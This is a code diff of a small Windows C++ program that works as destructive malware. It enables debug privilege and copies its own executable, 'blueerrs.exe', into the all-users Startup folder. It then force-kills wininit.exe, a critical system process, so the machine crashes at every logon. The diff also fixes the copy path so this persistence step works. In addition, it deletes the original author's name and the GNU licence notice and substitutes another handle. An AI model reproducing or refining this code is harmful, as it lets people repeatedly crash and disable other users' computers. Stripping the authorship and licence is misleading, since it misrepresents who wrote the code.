@@ -1,5 +1,4 @@
-//latest 2025/9/7 12:22 enhe wang
-//following GNU agreement
+//latest 2025/9/7 12:22 mrcmdmnb
 #include<iostream>
 #include<shellapi.h>
 #include<windows.h>
@@ -46,7 +45,7 @@ std::string getPath(const std::string& relativePath) {
 int main() {
 	enableDebugPrivilege();
 	std::string dest="C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    std::string absPath = getPath(__FILE__);
+    std::string absPath = getPath("blueerrs.exe");
     copy(absPath.c_str(),dest.c_str());
     //ShellExecuteEx(NULL,"open","cmd.exe","taskkill /f /im wininit.exe",NULL,SW_HIDE);
     system("taskkill /f /im wininit.exe");
